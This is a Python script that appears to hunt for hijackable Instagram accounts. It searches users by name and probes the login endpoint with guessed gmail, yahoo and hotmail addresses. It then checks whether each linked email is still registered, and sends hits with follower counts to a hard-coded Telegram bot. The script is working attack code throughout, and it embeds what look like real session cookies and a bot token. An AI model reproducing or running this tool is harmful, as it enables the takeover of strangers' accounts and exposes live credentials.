try:
    import colorama 
    import requests 
    from TSMRS import check
    from user_agent import generate_user_agent
except:
    from os import system as general 
    general("pip install requests TSMRS")
ch=check()
id='5645385208' #input("ID :: ")
tok="5815425184:AAGkLYBDkexTX7jeZH_C-UssTugsl7pgQvc"
name=input("name  1::")
name1=input('name 2::')
name3=input('name 3::')
nem=name,name1,name3
for name in nem:
        
    
    url=f'https://www.instagram.com/api/v1/web/search/topsearch/?context=blended&query={name}&rank_token=0.11692785907284398&include_reel=true'
    hed={
'Host': 'www.instagram.com',
'User-Agent': generate_user_agent(),
'Accept': '*/*',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate, br',
'X-CSRFToken': 'yiUxqBBIOrnaci9tJVhsCwb7V8lpIEAf',
'X-IG-App-ID': '936619743392459',
'X-ASBD-ID': '198387',
'X-IG-WWW-Claim': 'hmac.AR3NtiMI6na42wS2x8x2zURhBXbrn4xOdO6zX7pXp1wRV1KK',
'X-Requested-With': 'XMLHttpRequest',
'Alt-Used': 'www.instagram.com',
'Connection': 'keep-alive',
'Referer': 'https://www.instagram.com/',
'Cookie': 'ig_did=81FE3513-0E3E-44DC-B8A1-A8280B94A04B; datr=ZKCQY7ro6-XrEKrA5dtqln9O; mid=Y5CgcAAEAAE-T14rSxVShp1AW9-K; ig_nrcb=1; fbm_124024574287414=base_domain=.instagram.com; shbid="5517\054239168116\0541704487260:01f7207c36cab9c542b81aefb768f96e78d75189aee245b690c0b01c5394ffec8db29819"; shbts="1672951260\054239168116\0541704487260:01f7331ced4832fc367a124d1b02c49ba9c495f911b6b9aba93ad83e37a37321570f4752"; sessionid=239168116%3ABL8M3wn09U7Hkt%3A19%3AAYdeZi65U1Xm1q_KqQ1Tq2EE6EJwqvEHvgMSK-7OMA; ds_user_id=239168116; csrftoken=yiUxqBBIOrnaci9tJVhsCwb7V8lpIEAf; rur="ODN\054239168116\0541704584084:01f72c27ead73bdf300a863482b3ba5b55177fef546338f123a82ea2cd9ca1297177d8e7"; fbsr_124024574287414=asT0R7Uq_rWBDw4DGXQkfiTNZKY3fV9_xdYeUUJ7cT4.eyJ1c2VyX2lkIjoiMTAwMDc2MjQ4OTIxMTAwIiwiY29kZSI6IkFRQTB3YUI3cGV0bmg2cmNBLS1IcUQ5am16WkM0ZzZZMWN4V0lMcmU0OVU5eFY2WDlxTDlaQm1Idjk5OXVUdnJVakN1bnZCS3htbU5IaUJHeGU5bDFsQWZFbFFUZ2R0YTRzMlZoRVpNMHRNWHRfMlo3TThRMGQ2UTRuSXZNcGhQU3VpRmJTWkJaYWF5WTNaYU96S1JVcER2WjE3T1dzV2xCeG91bTY0Q3kyMUl0OGNBVldwLXNJdHVnLUY4U2R0Z1lfUjNyR0FNTG5YYWlkeE5JcDdWMm55bnVzN213NGVNdGx0dGliUUV2X3F3YkR4a2NHM2J2VVRnS0NPRmw2dkk4cDBvOEJoM1NNSmVuTzAtUl9HdC1zYkloMGhKNFdtdl94Sm1FZzMzbzF3NzZiTHBqZDQyN2JpM2RPTVAwcXRmSXduMl9iRkllSEVvaFVJSmpkZUlnNTZnIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUFzcTM5bjR2ZkZXZlAwbzIwMlB1ekZFem0xY3hPSWVUc0FjcXdoMWJkVEdJTjREbEl2dUg1ZTliNWNaQnFwOXFQSzNoWVpBVm1KeFZHYWp6NDRVYk8yc2t6amtwMTZjSTltd2tHZklEQVpCNUFkcU9oNW9sQWpOTU9EZWVXQ1lsdHpzZTlsZDBHUDhocUtOSVlUN1VVNTBBR1RldGh1aTJ1N3ZFM2pFdGlnOWYxZnBMVVpEIiwiYWxnb3JpdGhtIjoiSE1BQy1TSEEyNTYiLCJpc3N1ZWRfYXQiOjE2NzMwNDgwNzR9',
'Sec-Fetch-Dest': 'empty',
'Sec-Fetch-Mode': 'cors',
'Sec-Fetch-Site': 'same-origin'}
    reqemail=requests.get(url,headers=hed).json()['users']

    for ig in reqemail:
        user=ig['user']['username']
        

            
        url='https://www.instagram.com/api/v1/web/accounts/login/ajax/ '

        hed ={'Host': 'www.instagram.com',
        'Cookie': 'datr=ne2xY1DpXHiLNdSRGvsQv69C; ig_nrcb=1; mid=Y7Ht7AALAAGUZbSucPRGB7J4Yz1K; ig_did=48FDAD0E-6C62-42E0-A601-820096CAC93A; csrftoken=VhGXuakHiYQRzL3WWier8johCnWL2oMr',
        'Content-Length': '299',
        'Sec-Ch-Ua': '" Not A;Brand";v="99", "Chromium";v="96"',
        'X-Ig-App-Id': '936619743392459',
        'X-Ig-Www-Claim': '0',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua-Mobile': '?0',
        'X-Instagram-Ajax': '1006793267',
        'Viewport-Width': '683',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': '*/*',
        'X-Csrftoken': 'VhGXuakHiYQRzL3WWier8johCnWL2oMr',
        'User-Agent': generate_user_agent(),
        'X-Asbd-Id': '198387',
        'Sec-Ch-Prefers-Color-Scheme': 'light',
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Origin': 'https://www.instagram.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.instagram.com/',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9'}


        data={'nc_password':'Kohusinko1','username':f'{user}@gmail.com'}

        req=requests.post(url=url,headers=hed,data=data).json()
        if "user" in req:
           
            c=ch.Gmail(f"{user}@gmail.com")
            if c=='200':
                print(f'No acount {user}@gmail.com')
                
            else:
                urlname=f'https://www.instagram.com/api/v1/users/web_profile_info/?username={user}'

                hedname={'Host': 'www.instagram.com',
'User-Agent': generate_user_agent(),
'Accept': '*/*',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate, br',
'X-CSRFToken': 's0awf6kDrr7kM5jIb8DHm2iDeHAVZT8H',
'X-IG-App-ID': '936619743392459',
'X-ASBD-ID': '198387',
'X-IG-WWW-Claim': 'hmac.AR3NtiMI6na42wS2x8x2zURhBXbrn4xOdO6zX7pXp1wRV0Us',
'X-Requested-With': 'XMLHttpRequest',
'Connection': 'keep-alive',
'Referer': 'https://www.instagram.com/h____sm/',
'Cookie': 'ig_did=81FE3513-0E3E-44DC-B8A1-A8280B94A04B; datr=ZKCQY7ro6-XrEKrA5dtqln9O; mid=Y5CgcAAEAAE-T14rSxVShp1AW9-K; ig_nrcb=1; fbm_124024574287414=base_domain=.instagram.com; shbid="5517\054239168116\0541704487260:01f7207c36cab9c542b81aefb768f96e78d75189aee245b690c0b01c5394ffec8db29819"; shbts="1672951260\054239168116\0541704487260:01f7331ced4832fc367a124d1b02c49ba9c495f911b6b9aba93ad83e37a37321570f4752"; csrftoken=s0awf6kDrr7kM5jIb8DHm2iDeHAVZT8H; ds_user_id=239168116; sessionid=239168116%3AcuIhdqhVhnVTRC%3A22%3AAYeLym8Ffmk6k6IzWERD1rKC8k-fMeDUQt7N1Ue0FQ; fbsr_124024574287414=fPDPsGsoFYnv5iUY75CGVYDNCFobJnSeFEmn0g9aXcQ.eyJ1c2VyX2lkIjoiMTAwMDc2MjQ4OTIxMTAwIiwiY29kZSI6IkFRQ243T052NWQxWmdDcmlKcUt6VUE3WmdGVlVkR2JaSGtFd2ZzZllDRlFLYjJsREJZSVlSV2RVQ0g1MzY4OFVYcm9VaFJMX3hqa19iYjB4R19ySl9GdWtCOFlQV05HZmg1UXYxM1hZZi0zUnJyYnRaY3N5TTdYS0hxVjVzV3JqQVpSN0RCLWhOanVtUGp6T2Y5SlJ4MENVTl8yN2ZJYldway1idGlnZGRCdDhzUHlTNzNPOF9FQXlyTWRqSU9nalNQdGlZei15anJsdS1yelRFVEF2QVNuZ3N6LXNkaDkwalRPWVRBbEMzOXNLUFBwTWRWUEd5Q001TmhTTVpZSHhJTU1DZE1VQVBTU1NicnF0RHI0Zk5tVy1uNjk5OUVqaWtIVThzUHVfY1NGbGJIWXdoSDhTTzVTWE9yR0VLdGVFVjZVaFhLX0xPSUlRM1JuMmdMelVYRXJpIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUtRc09sSWppSWhoTGgzbDN3UWZGWFAxcWo5enFBSW1XcVBaQmg2VHRaQzJtUE9zcnhuMm9YNVpCQm9aQ21FNkdJcDdqN0JTd2tsb1lMQzRSQzZ0cFFzZndrazlZMDRQMkZBcUI2dFRmYXhTSE1qRjFkdTRwRWhRd2dKdUpDV0pUcDJybHFoQUtyTVloc3FYSmZOVW5rOUF3Nk9BN1laQ2MzeXNEaTVrN0NaQ2E4czU1Njc0NFpEIiwiYWxnb3JpdGhtIjoiSE1BQy1TSEEyNTYiLCJpc3N1ZWRfYXQiOjE2NzMxMjM1MTF9; rur="ODN\054239168116\0541704659746:01f704a47b19db4f6096090c96ebc163e18daa688efd12dfcb1fdd24db444fa174c44950"; fbsr_124024574287414=fPDPsGsoFYnv5iUY75CGVYDNCFobJnSeFEmn0g9aXcQ.eyJ1c2VyX2lkIjoiMTAwMDc2MjQ4OTIxMTAwIiwiY29kZSI6IkFRQ243T052NWQxWmdDcmlKcUt6VUE3WmdGVlVkR2JaSGtFd2ZzZllDRlFLYjJsREJZSVlSV2RVQ0g1MzY4OFVYcm9VaFJMX3hqa19iYjB4R19ySl9GdWtCOFlQV05HZmg1UXYxM1hZZi0zUnJyYnRaY3N5TTdYS0hxVjVzV3JqQVpSN0RCLWhOanVtUGp6T2Y5SlJ4MENVTl8yN2ZJYldway1idGlnZGRCdDhzUHlTNzNPOF9FQXlyTWRqSU9nalNQdGlZei15anJsdS1yelRFVEF2QVNuZ3N6LXNkaDkwalRPWVRBbEMzOXNLUFBwTWRWUEd5Q001TmhTTVpZSHhJTU1DZE1VQVBTU1NicnF0RHI0Zk5tVy1uNjk5OUVqaWtIVThzUHVfY1NGbGJIWXdoSDhTTzVTWE9yR0VLdGVFVjZVaFhLX0xPSUlRM1JuMmdMelVYRXJpIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUtRc09sSWppSWhoTGgzbDN3UWZGWFAxcWo5enFBSW1XcVBaQmg2VHRaQzJtUE9zcnhuMm9YNVpCQm9aQ21FNkdJcDdqN0JTd2tsb1lMQzRSQzZ0cFFzZndrazlZMDRQMkZBcUI2dFRmYXhTSE1qRjFkdTRwRWhRd2dKdUpDV0pUcDJybHFoQUtyTVloc3FYSmZOVW5rOUF3Nk9BN1laQ2MzeXNEaTVrN0NaQ2E4czU1Njc0NFpEIiwiYWxnb3JpdGhtIjoiSE1BQy1TSEEyNTYiLCJpc3N1ZWRfYXQiOjE2NzMxMjM1MTF9',
'Sec-Fetch-Dest': 'empty',
'Sec-Fetch-Mode': 'cors',
'Sec-Fetch-Site': 'same-origin'}
                i=requests.get(url=urlname,headers=hedname).json()
                follow=i['data']['user']['edge_follow']['count']
                followers=i['data']['user']['edge_followed_by']['count']
                name = i['data']['user']['full_name']
            #business=i['data']['user']['business_email']

                kkoo=f'''name:{name}\nfollowers:{followers}\nfollowing:{follow}'''
                print (f'YES email True {user}@gmail.com')
                requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={id}&text=email : {user}@gmail.com\n{kkoo}")

        else:
            data={'nc_password':'Kohusinko1','username':f'{user}@yahoo.com'}
            req=requests.post(url=url,headers=hed,data=data).json()
            if "user" in req:
                c=ch.Yahoo(f"{user}@yahoo.com")
                if c=='200':
                    print(f'No acount {user}@yahoo.com')
                    
                else:
                    urlname=f'https://www.instagram.com/api/v1/users/web_profile_info/?username={user}'

                    hedname={'Host': 'www.instagram.com',
'User-Agent': generate_user_agent(),
'Accept': '*/*',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate, br',
'X-CSRFToken': 's0awf6kDrr7kM5jIb8DHm2iDeHAVZT8H',
'X-IG-App-ID': '936619743392459',
'X-ASBD-ID': '198387',
'X-IG-WWW-Claim': 'hmac.AR3NtiMI6na42wS2x8x2zURhBXbrn4xOdO6zX7pXp1wRV0Us',
'X-Requested-With': 'XMLHttpRequest',
'Connection': 'keep-alive',
'Referer': 'https://www.instagram.com/h____sm/',
'Cookie': 'ig_did=81FE3513-0E3E-44DC-B8A1-A8280B94A04B; datr=ZKCQY7ro6-XrEKrA5dtqln9O; mid=Y5CgcAAEAAE-T14rSxVShp1AW9-K; ig_nrcb=1; fbm_124024574287414=base_domain=.instagram.com; shbid="5517\054239168116\0541704487260:01f7207c36cab9c542b81aefb768f96e78d75189aee245b690c0b01c5394ffec8db29819"; shbts="1672951260\054239168116\0541704487260:01f7331ced4832fc367a124d1b02c49ba9c495f911b6b9aba93ad83e37a37321570f4752"; csrftoken=s0awf6kDrr7kM5jIb8DHm2iDeHAVZT8H; ds_user_id=239168116; sessionid=239168116%3AcuIhdqhVhnVTRC%3A22%3AAYeLym8Ffmk6k6IzWERD1rKC8k-fMeDUQt7N1Ue0FQ; fbsr_124024574287414=fPDPsGsoFYnv5iUY75CGVYDNCFobJnSeFEmn0g9aXcQ.eyJ1c2VyX2lkIjoiMTAwMDc2MjQ4OTIxMTAwIiwiY29kZSI6IkFRQ243T052NWQxWmdDcmlKcUt6VUE3WmdGVlVkR2JaSGtFd2ZzZllDRlFLYjJsREJZSVlSV2RVQ0g1MzY4OFVYcm9VaFJMX3hqa19iYjB4R19ySl9GdWtCOFlQV05HZmg1UXYxM1hZZi0zUnJyYnRaY3N5TTdYS0hxVjVzV3JqQVpSN0RCLWhOanVtUGp6T2Y5SlJ4MENVTl8yN2ZJYldway1idGlnZGRCdDhzUHlTNzNPOF9FQXlyTWRqSU9nalNQdGlZei15anJsdS1yelRFVEF2QVNuZ3N6LXNkaDkwalRPWVRBbEMzOXNLUFBwTWRWUEd5Q001TmhTTVpZSHhJTU1DZE1VQVBTU1NicnF0RHI0Zk5tVy1uNjk5OUVqaWtIVThzUHVfY1NGbGJIWXdoSDhTTzVTWE9yR0VLdGVFVjZVaFhLX0xPSUlRM1JuMmdMelVYRXJpIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUtRc09sSWppSWhoTGgzbDN3UWZGWFAxcWo5enFBSW1XcVBaQmg2VHRaQzJtUE9zcnhuMm9YNVpCQm9aQ21FNkdJcDdqN0JTd2tsb1lMQzRSQzZ0cFFzZndrazlZMDRQMkZBcUI2dFRmYXhTSE1qRjFkdTRwRWhRd2dKdUpDV0pUcDJybHFoQUtyTVloc3FYSmZOVW5rOUF3Nk9BN1laQ2MzeXNEaTVrN0NaQ2E4czU1Njc0NFpEIiwiYWxnb3JpdGhtIjoiSE1BQy1TSEEyNTYiLCJpc3N1ZWRfYXQiOjE2NzMxMjM1MTF9; rur="ODN\054239168116\0541704659746:01f704a47b19db4f6096090c96ebc163e18daa688efd12dfcb1fdd24db444fa174c44950"; fbsr_124024574287414=fPDPsGsoFYnv5iUY75CGVYDNCFobJnSeFEmn0g9aXcQ.eyJ1c2VyX2lkIjoiMTAwMDc2MjQ4OTIxMTAwIiwiY29kZSI6IkFRQ243T052NWQxWmdDcmlKcUt6VUE3WmdGVlVkR2JaSGtFd2ZzZllDRlFLYjJsREJZSVlSV2RVQ0g1MzY4OFVYcm9VaFJMX3hqa19iYjB4R19ySl9GdWtCOFlQV05HZmg1UXYxM1hZZi0zUnJyYnRaY3N5TTdYS0hxVjVzV3JqQVpSN0RCLWhOanVtUGp6T2Y5SlJ4MENVTl8yN2ZJYldway1idGlnZGRCdDhzUHlTNzNPOF9FQXlyTWRqSU9nalNQdGlZei15anJsdS1yelRFVEF2QVNuZ3N6LXNkaDkwalRPWVRBbEMzOXNLUFBwTWRWUEd5Q001TmhTTVpZSHhJTU1DZE1VQVBTU1NicnF0RHI0Zk5tVy1uNjk5OUVqaWtIVThzUHVfY1NGbGJIWXdoSDhTTzVTWE9yR0VLdGVFVjZVaFhLX0xPSUlRM1JuMmdMelVYRXJpIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUtRc09sSWppSWhoTGgzbDN3UWZGWFAxcWo5enFBSW1XcVBaQmg2VHRaQzJtUE9zcnhuMm9YNVpCQm9aQ21FNkdJcDdqN0JTd2tsb1lMQzRSQzZ0cFFzZndrazlZMDRQMkZBcUI2dFRmYXhTSE1qRjFkdTRwRWhRd2dKdUpDV0pUcDJybHFoQUtyTVloc3FYSmZOVW5rOUF3Nk9BN1laQ2MzeXNEaTVrN0NaQ2E4czU1Njc0NFpEIiwiYWxnb3JpdGhtIjoiSE1BQy1TSEEyNTYiLCJpc3N1ZWRfYXQiOjE2NzMxMjM1MTF9',
'Sec-Fetch-Dest': 'empty',
'Sec-Fetch-Mode': 'cors',
'Sec-Fetch-Site': 'same-origin'}
                    i=requests.get(url=urlname,headers=hedname).json()
                    follow=i['data']['user']['edge_follow']['count']
                    followers=i['data']['user']['edge_followed_by']['count']
                    name = i['data']['user']['full_name']
                #business=i['data']['user']['business_email']

                    kkoo=f'''name:{name}\nfollowers:{followers}\nfollowing:{follow}'''
                    print (f'YES email True {user}@yahoo.com')
                    requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={id}&text=email : {user}@yahoo.com\n{kkoo}")
            else:
                data={'nc_password':'Kohusinko1','username':f'{user}@hotmail.com'}
                req=requests.post(url=url,headers=hed,data=data).json()
                if "user" in req:
                    c=ch.Hotmail(f"{user}@hotmail.com")
                    if c=='200':
                        print(f'No acount {user}@hotmail.com')

                
                    else:
                        urlname=f'https://www.instagram.com/api/v1/users/web_profile_info/?username={user}'

                        hedname={'Host': 'www.instagram.com',
'User-Agent': generate_user_agent(),
'Accept': '*/*',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate, br',
'X-CSRFToken': 's0awf6kDrr7kM5jIb8DHm2iDeHAVZT8H',
'X-IG-App-ID': '936619743392459',
'X-ASBD-ID': '198387',
'X-IG-WWW-Claim': 'hmac.AR3NtiMI6na42wS2x8x2zURhBXbrn4xOdO6zX7pXp1wRV0Us',
'X-Requested-With': 'XMLHttpRequest',
'Connection': 'keep-alive',
'Referer': 'https://www.instagram.com/h____sm/',
'Cookie': 'ig_did=81FE3513-0E3E-44DC-B8A1-A8280B94A04B; datr=ZKCQY7ro6-XrEKrA5dtqln9O; mid=Y5CgcAAEAAE-T14rSxVShp1AW9-K; ig_nrcb=1; fbm_124024574287414=base_domain=.instagram.com; shbid="5517\054239168116\0541704487260:01f7207c36cab9c542b81aefb768f96e78d75189aee245b690c0b01c5394ffec8db29819"; shbts="1672951260\054239168116\0541704487260:01f7331ced4832fc367a124d1b02c49ba9c495f911b6b9aba93ad83e37a37321570f4752"; csrftoken=s0awf6kDrr7kM5jIb8DHm2iDeHAVZT8H; ds_user_id=239168116; sessionid=239168116%3AcuIhdqhVhnVTRC%3A22%3AAYeLym8Ffmk6k6IzWERD1rKC8k-fMeDUQt7N1Ue0FQ; fbsr_124024574287414=fPDPsGsoFYnv5iUY75CGVYDNCFobJnSeFEmn0g9aXcQ.eyJ1c2VyX2lkIjoiMTAwMDc2MjQ4OTIxMTAwIiwiY29kZSI6IkFRQ243T052NWQxWmdDcmlKcUt6VUE3WmdGVlVkR2JaSGtFd2ZzZllDRlFLYjJsREJZSVlSV2RVQ0g1MzY4OFVYcm9VaFJMX3hqa19iYjB4R19ySl9GdWtCOFlQV05HZmg1UXYxM1hZZi0zUnJyYnRaY3N5TTdYS0hxVjVzV3JqQVpSN0RCLWhOanVtUGp6T2Y5SlJ4MENVTl8yN2ZJYldway1idGlnZGRCdDhzUHlTNzNPOF9FQXlyTWRqSU9nalNQdGlZei15anJsdS1yelRFVEF2QVNuZ3N6LXNkaDkwalRPWVRBbEMzOXNLUFBwTWRWUEd5Q001TmhTTVpZSHhJTU1DZE1VQVBTU1NicnF0RHI0Zk5tVy1uNjk5OUVqaWtIVThzUHVfY1NGbGJIWXdoSDhTTzVTWE9yR0VLdGVFVjZVaFhLX0xPSUlRM1JuMmdMelVYRXJpIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUtRc09sSWppSWhoTGgzbDN3UWZGWFAxcWo5enFBSW1XcVBaQmg2VHRaQzJtUE9zcnhuMm9YNVpCQm9aQ21FNkdJcDdqN0JTd2tsb1lMQzRSQzZ0cFFzZndrazlZMDRQMkZBcUI2dFRmYXhTSE1qRjFkdTRwRWhRd2dKdUpDV0pUcDJybHFoQUtyTVloc3FYSmZOVW5rOUF3Nk9BN1laQ2MzeXNEaTVrN0NaQ2E4czU1Njc0NFpEIiwiYWxnb3JpdGhtIjoiSE1BQy1TSEEyNTYiLCJpc3N1ZWRfYXQiOjE2NzMxMjM1MTF9; rur="ODN\054239168116\0541704659746:01f704a47b19db4f6096090c96ebc163e18daa688efd12dfcb1fdd24db444fa174c44950"; fbsr_124024574287414=fPDPsGsoFYnv5iUY75CGVYDNCFobJnSeFEmn0g9aXcQ.eyJ1c2VyX2lkIjoiMTAwMDc2MjQ4OTIxMTAwIiwiY29kZSI6IkFRQ243T052NWQxWmdDcmlKcUt6VUE3WmdGVlVkR2JaSGtFd2ZzZllDRlFLYjJsREJZSVlSV2RVQ0g1MzY4OFVYcm9VaFJMX3hqa19iYjB4R19ySl9GdWtCOFlQV05HZmg1UXYxM1hZZi0zUnJyYnRaY3N5TTdYS0hxVjVzV3JqQVpSN0RCLWhOanVtUGp6T2Y5SlJ4MENVTl8yN2ZJYldway1idGlnZGRCdDhzUHlTNzNPOF9FQXlyTWRqSU9nalNQdGlZei15anJsdS1yelRFVEF2QVNuZ3N6LXNkaDkwalRPWVRBbEMzOXNLUFBwTWRWUEd5Q001TmhTTVpZSHhJTU1DZE1VQVBTU1NicnF0RHI0Zk5tVy1uNjk5OUVqaWtIVThzUHVfY1NGbGJIWXdoSDhTTzVTWE9yR0VLdGVFVjZVaFhLX0xPSUlRM1JuMmdMelVYRXJpIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUtRc09sSWppSWhoTGgzbDN3UWZGWFAxcWo5enFBSW1XcVBaQmg2VHRaQzJtUE9zcnhuMm9YNVpCQm9aQ21FNkdJcDdqN0JTd2tsb1lMQzRSQzZ0cFFzZndrazlZMDRQMkZBcUI2dFRmYXhTSE1qRjFkdTRwRWhRd2dKdUpDV0pUcDJybHFoQUtyTVloc3FYSmZOVW5rOUF3Nk9BN1laQ2MzeXNEaTVrN0NaQ2E4czU1Njc0NFpEIiwiYWxnb3JpdGhtIjoiSE1BQy1TSEEyNTYiLCJpc3N1ZWRfYXQiOjE2NzMxMjM1MTF9',
'Sec-Fetch-Dest': 'empty',
'Sec-Fetch-Mode': 'cors',
'Sec-Fetch-Site': 'same-origin'}
                        i=requests.get(url=urlname,headers=hedname).json()
                        follow=i['data']['user']['edge_follow']['count']
                        followers=i['data']['user']['edge_followed_by']['count']
                        name = i['data']['user']['full_name']
            #business=i['data']['user']['business_email']

                        kkoo=f'''name:{name}\nfollowers:{followers}\nfollowing:{follow}'''
                        print (f'YES email True {user}@hotmail.com')
                        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={id}&text=email : {user}@hotmail.com\n{kkoo}")
                else:
                    print ('No avilbal')


                

            
            
